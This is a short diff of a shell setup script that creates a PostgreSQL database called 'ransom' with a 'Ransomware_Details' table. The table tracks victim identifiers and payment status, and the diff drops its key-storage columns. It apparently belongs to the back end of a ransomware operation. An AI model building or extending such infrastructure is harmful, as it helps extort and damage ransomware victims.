@@ -7,8 +7,6 @@ echo "[+]Setting up psql server"
 su - postgres && psql -c "CREATE DATABASE ransom;"
 su - postgres && psql -c "\c ransom; create TABLE Ransomware_Details(\
 	identifier VARCHAR(20) UNIQUE NOT NULL,\
-	public_key VARCHAR(600) UNIQUE NOT NULL,\
-	private_key VARCHAR(3000) UNIQUE NOT NULL,\
 	payment_status VARCHAR(10) NOT NULL
 	);"
 
